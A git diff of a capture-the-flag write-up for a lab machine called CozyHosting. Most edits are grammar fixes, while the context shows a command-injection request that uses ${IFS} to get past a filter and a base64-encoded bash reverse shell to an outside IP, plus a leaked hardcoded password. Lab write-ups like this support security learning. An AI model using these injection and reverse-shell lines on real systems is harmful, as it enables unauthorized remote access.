@@ -15,7 +15,7 @@ Cozy Hosting is a cloud server provider company, which offer multiple management
 
 <details>
 <summary><b>Nmap scan result</b></summary>
-
+<div markdown="1">
 ~~~
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -31,24 +31,24 @@ PORT   STATE SERVICE REASON         VERSION
 |_  Supported Methods: GET OPTIONS
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ~~~
-
+</div>
 </details>
 
 ## Investigation
 First, when we look at the port scan result we can see a usual web server infrastructure that exposes SSH to further management.  
-It is using nginx as a reverse proxy and redirect http requests to http://cozyhosting.htb.  
+It is using nginx as a reverse proxy and it redirects HTTP requests to http://cozyhosting.htb.  
 ![CozyHosting website](/assets/2024-03-02-writeups-cozyhosting-htb/cozyhosting_website.png "CozyHosting website")
 
 The main website contains a login page that doesn't allow registration. We perform some basic SQLi tests but none of them worked/crashed.  
 ![Login Page](/assets/2024-03-02-writeups-cozyhosting-htb/login_page.png "Login Page")
 
 Reverse proxy technologies can forward the request to another server that is running on localhost only.
-Sometimes the backend server can return this information on the HTTP Header, which wasn't this case.  
-Another way to perform this test is to access an error page, the 404 can be a specially crafted for a better UX than the default nginx error.  
+Sometimes the backend server can return this information on the HTTP Header, which wasn't the case.  
+Another way to perform this test is to access an error page, the 404 can be custom-crafted for a better UX than the default nginx error.  
 We got the following message  
 ![Whitelabel Error](/assets/2024-03-02-writeups-cozyhosting-htb/whitelabel_error.png "Whitelabal Error")
 
-This doesn't tell which server is in place, but we can search for the error and found out where it came from.  
+This doesn't tell which server is in place, but we can search for the error and find out where it came from.  
 A lot of results pointed it out to the [Spring Boot Framework][java-spring-boot].  
 Now we know what we are dealing with, we can perform enumeration targeting the framework only.  
 A [Hacktricks guide on Spring Actuators][spring-actuators] set us in the right direction.
@@ -78,7 +78,7 @@ The admin dashboard
 
 Exploring the dashboard for more information but none was found.
 
-There is a service that enable us to include a host into the automatic patch list.
+There is a service that enable us to include a host in the automatic patch list.
 Now we will the service using placeholder values.
 ```
 $ curl -vv -X POST http://cozyhosting.htb/executessh -H 'Cookie: JSESSIONID=60624E501F34D4469CFBE1CD53AF3273' --data 'username=user&host=host'
@@ -101,7 +101,7 @@ $ curl -vv -X POST http://cozyhosting.htb/executessh -H 'Cookie: JSESSIONID=6062
 
 At this moment we know that the server is executing the ssh command which has a basic syntax of `ssh USERNAME@HOSTNAME`.
 We can build a reverse shell command.
-In the following tests we found that there are a whitespace filter on username.  
+In the following test we found that there is a whitespace filter on the username field.  
 To bypass the filter we can use ${IFS} instead of spaced and execute our reverse shell.  
 ```
 $ curl -vv -X POST http://cozyhosting.htb/executessh -H 'Cookie: JSESSIONID=60624E501F34D4469CFBE1CD53AF3273' --data 'username=;echo${IFS}YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMTEvNTU1NSAwPiYxCg==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;&host=host'
@@ -109,7 +109,7 @@ $ curl -vv -X POST http://cozyhosting.htb/executessh -H 'Cookie: JSESSIONID=6062
 ```
 
 ### User app
-The shell was execute as the user `app` on /app dir
+The shell is executed as the user `app` on /app dir
 ```
 uid=1001(app) gid=1001(app) groups=1001(app)
 ```
@@ -123,8 +123,8 @@ josh:x:1003:1003::/home/josh:/usr/bin/bash
 
 ```
 
-The cozyhosting app is /app/cloudhosting-0.0.1.jar
-Check running processes to see if any variable was passed as parameter
+The Cozyhosting app is /app/cloudhosting-0.0.1.jar
+Check running processes to see if any variable was passed as Parameter
 ```
 $ ps aux
 ... SNIP ...
@@ -133,7 +133,7 @@ $ ps aux
 
 ```
 
-We can decompile it with jadx and search for password. We found two hardcoded passwords, one for kanderson and another for postgresql.
+We can decompile it with jadx and search for passwords. We found two hardcoded passwords, one for kanderson and another for postgresql.
 ```
 kanderson:
     username=kanderson&password=MRdEQuv6~6P9
